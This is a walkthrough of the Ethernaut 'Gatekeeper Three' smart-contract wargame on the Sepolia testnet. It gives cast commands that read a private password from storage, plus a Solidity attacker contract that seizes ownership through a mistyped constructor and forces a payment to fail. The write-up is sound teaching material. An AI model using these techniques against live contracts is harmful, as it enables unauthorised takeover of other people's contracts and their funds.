# Ethernaut Challenge 28 — Gatekeeper Three

Cope with gates and become an entrant.

**Instance address**

```text
0xA39c7757e03071E95d132537dd74559E3E05b8E8
```

---

## 🎯 Goal

Become the `entrant` by passing all three gates.

---

## 🔍 Initial Inspection

```bash
GATEKEEPER=0xA39c7757e03071E95d132537dd74559E3E05b8E8

cast call $GATEKEEPER \
    "owner()(address)" \
    --rpc-url $SEPOLIA_RPC_URL
```

```
0x0000000000000000000000000000000000000000
```

### ⚠️ Vulnerability — Fake constructor

```solidity
function construct0r() public {
    owner = msg.sender;
}
```

This is **not a constructor**, so anyone can call it and become the owner.

---

```bash
cast call $GATEKEEPER "entrant()(address)" --rpc-url $SEPOLIA_RPC_URL
```

```
0x0000000000000000000000000000000000000000
```

```bash
cast call $GATEKEEPER "allowEntrance()(bool)" --rpc-url $SEPOLIA_RPC_URL
```

```
false
```

```bash
cast call $GATEKEEPER "trick()(address)" --rpc-url $SEPOLIA_RPC_URL
```

```
0x0000000000000000000000000000000000000000
```

---

## 🧠 Understanding the Gates

### Gate 1

```solidity
require(msg.sender == owner);
require(tx.origin != owner);
```

👉 Requirements:

* `owner` must be a contract
* the call must come **through** that contract

---

### Gate 2

```solidity
require(allowEntrance == true);
```

To enable this:

```solidity
getAllowance(password)
```

But this depends on the `SimpleTrick` contract.

---

### Gate 3

```solidity
if (
    address(this).balance > 0.001 ether &&
    payable(owner).send(0.001 ether) == false
) {
    _;
}
```

👉 Requirements:

* contract must have > `0.001 ether`
* sending ETH to `owner` must **fail**

---

## 🔍 Analyzing `SimpleTrick`

We must retrieve the password:

```solidity
uint256 private password = block.timestamp;
```

---

## 🛠️ Step 1 — Deploy the Trick contract

```bash
cast send $GATEKEEPER \
    "createTrick()" \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Get its address:

```bash
cast call $GATEKEEPER \
    "trick()(address)" \
    --rpc-url $SEPOLIA_RPC_URL
```

```
0x7df262921CD03fa1a2efF44c0F6314cea5cEaAaa
```

---

## 🔐 Step 2 — Read the password from storage

```bash
TRICK=0x7df262921CD03fa1a2efF44c0F6314cea5cEaAaa

cast --to-dec $(cast storage $TRICK 2 --rpc-url $SEPOLIA_RPC_URL)
```

```
1775737788
```

```bash
PASSWORD=1775737788
```

Sanity check:

```bash
cast call $TRICK \
    "checkPassword(uint256)(bool)" $PASSWORD \
    --rpc-url $SEPOLIA_RPC_URL
```

```
true
```

---

## 💰 Step 3 — Fund the contract (Gate 3)

```bash
cast send $GATEKEEPER \
  --value 0.0011ether \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut
```

Verify:

```bash
cast balance $GATEKEEPER -e --rpc-url $SEPOLIA_RPC_URL
```

```
0.001100000000000000
```

---

## 💣 Exploit Strategy

We combine all vulnerabilities:

1. Take ownership via `construct0r()`
2. Use the recovered password to set `allowEntrance`
3. Call `enter()` from a contract
4. Force `send()` to fail using a reverting `receive()`

---

## 🛠️ Attacker Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperThree} from "./GatekeeperThree.sol";

contract GatekeeperThreeAttacker {
    GatekeeperThree public gatekeeper;
    uint256 public immutable password;

    constructor(address _gatekeeper, uint256 _password) {
        gatekeeper = GatekeeperThree(_gatekeeper);
        password = _password;
    }

    function attack() external {
        gatekeeper.construct0r();
        gatekeeper.getAllowance(password);
        gatekeeper.enter();
    }

    receive() external payable {
        revert();
    }
}
```

---

## 🚀 Step 4 — Deploy attacker

```bash
forge create src/challenge-28-gatekeeper-three/GatekeeperThreeAttacker.sol:GatekeeperThreeAttacker \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut \
  --broadcast \
  --constructor-args $GATEKEEPER $PASSWORD
```

```
0xb11D40f3D317Ad10dCd96F619f20D77b6Af1ae28
```

```bash
ATTACKER=0xb11D40f3D317Ad10dCd96F619f20D77b6Af1ae28
```

---

## ⚔️ Step 5 — Execute exploit

```bash
cast send $ATTACKER \
  "attack()" \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut
```

---

## ✅ Step 6 — Verify

```bash
cast call $GATEKEEPER \
    "entrant()(address)" \
    --rpc-url $SEPOLIA_RPC_URL
```

```
0xeCF94300dD67bB8c31F41BE3a2136D3f0abFb0B0
```

✅ Challenge solved.
